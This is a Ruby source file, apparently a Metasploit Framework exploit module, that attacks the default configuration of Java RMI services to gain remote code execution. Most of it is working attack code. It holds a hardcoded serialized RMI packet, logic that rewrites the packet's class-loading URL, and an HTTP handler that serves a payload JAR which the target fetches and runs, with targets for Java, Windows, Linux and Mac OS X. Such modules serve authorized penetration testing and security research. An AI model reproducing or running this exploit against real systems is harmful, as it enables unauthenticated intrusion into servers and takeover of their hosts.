##
# $Id: java_rmi_server.rb 13186 2011-07-15 20:44:08Z egypt $
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
	Rank = ExcellentRanking

	include Msf::Exploit::Remote::HttpServer
	include Msf::Exploit::Remote::Tcp

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'Java RMI Server Insecure Default Configuration Java Code Execution',
			'Description'    => %q{
					This module takes advantage of the default configuration of the RMI Registry and
				RMI Activation services, which allow loading classes from any remote (HTTP) URL. As it
				invokes a method in the RMI Distributed Garbage Collector which is available via every
				RMI endpoint, it can be used against both rmiregistry and rmid, and against most other
				(custom) RMI endpoints as well.

					Note that it does not work against Java Management Extension (JMX) ports since those do
				not support remote class loading, unless another RMI endpoint is active in the same
				Java process.
				
					RMI method calls do not support or require any sort of authentication.
			},
			'Author'         => [ 'mihi' ],
			'License'        => MSF_LICENSE,
			'Version'        => '$Revision: 13186 $',
			'References'     =>
				[
					# RMI protocol specification
					[ 'URL', 'http://download.oracle.com/javase/1.3/docs/guide/rmi/spec/rmi-protocol.html'],
				],
			'Platform'       => ['java', 'win', 'osx', 'linux', 'solaris'],
			'Privileged'     => true,
			'Payload'       => { 'BadChars' => '', 'DisableNops' => true },
			'Stance'        => Msf::Exploit::Stance::Aggressive,
			'Targets'       =>
				[
					[ 'Generic (Java Payload)',
						{
							'Platform' => ['java'],
							'Arch' => ARCH_JAVA
						}
					],
					[ 'Windows x86 (Native Payload)',
						{
							'Platform' => 'win',
							'Arch' => ARCH_X86,
						}
					],
					[ 'Linux x86 (Native Payload)',
						{
							'Platform' => 'linux',
							'Arch' => ARCH_X86,
						}
					],
					[ 'Mac OS X PPC (Native Payload)',
						{
							'Platform' => 'osx',
							'Arch' => ARCH_PPC,
						}
					],
					[ 'Mac OS X x86 (Native Payload)',
						{
							'Platform' => 'osx',
							'Arch' => ARCH_X86,
						}
					]
				],
			'DefaultTarget' => 1
		))
		register_options( [ Opt::RPORT(1099) ], self.class)
	end

	def exploit
		start_service()
		connect

		jar = rand_text_alpha(rand(8)+1) + '.jar'
		old_url = "file:./rmidummy.jar"
		new_url = get_uri + '/' + jar
		packet = gen_rmi_packet
		# Java strings in serialized data are prefixed with a 2-byte, big endian length
		# (at least, as long as they are shorter than 65536 bytes)
		find_me = [old_url.length].pack("n") + old_url
		idx = packet.index(find_me)
		len = [new_url.length].pack("n")
		# Now replace it with the new url
		packet[idx, find_me.length] = len + new_url

		# write out minimal header and packet
		print_status("Sending request for #{new_url}")
		#sock.put("JRMI" + [2].pack("n") + "K" + [0].pack("n") + [0].pack("N") + packet);
		sock.put("JRMI" + [2,0x4b,0,0].pack("nCnN") + packet);

		# wait for the request to be handled
		while not session_created?
			select(nil, nil, nil, 0.25)
			handler()
		end		
		
	end

	def on_request_uri(cli, request)
		if request.uri =~ /\.jar$/i		
			p = regenerate_payload(cli)
			jar = p.encoded_jar
			paths = [
				[ "metasploit", "RMILoader.class" ],
				[ "metasploit", "RMIPayload.class" ],
			]
			jar.add_files(paths, [ Msf::Config.data_directory, "java" ])

			send_response(cli, jar.pack,
			{
				'Content-Type' => 'application/java-archive',
				'Connection'   => 'close',
				'Pragma'       => 'no-cache'
			})

			print_status("Replied to Request for Payload JAR")
		end
	end

	
	def gen_rmi_packet
		"\x50\xac\xed\x00\x05\x77\x22\x00\x00\x00\x00\x00\x00\x00\x02\x00" +
		"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" +
		"\x00\xf6\xb6\x89\x8d\x8b\xf2\x86\x43\x75\x72\x00\x18\x5b\x4c\x6a" +
		"\x61\x76\x61\x2e\x72\x6d\x69\x2e\x73\x65\x72\x76\x65\x72\x2e\x4f" +
		"\x62\x6a\x49\x44\x3b\x87\x13\x00\xb8\xd0\x2c\x64\x7e\x02\x00\x00" +
		"\x70\x78\x70\x00\x00\x00\x00\x77\x08\x00\x00\x00\x00\x00\x00\x00" +
		"\x00\x73\x72\x00\x14\x6d\x65\x74\x61\x73\x70\x6c\x6f\x69\x74\x2e" +
		"\x52\x4d\x49\x4c\x6f\x61\x64\x65\x72\xa1\x65\x44\xba\x26\xf9\xc2" +
		"\xf4\x02\x00\x00\x74\x00\x13\x66\x69\x6c\x65\x3a\x2e\x2f\x72\x6d" +
		"\x69\x64\x75\x6d\x6d\x79\x2e\x6a\x61\x72\x78\x70\x77\x01\x00\x0a"
	end

end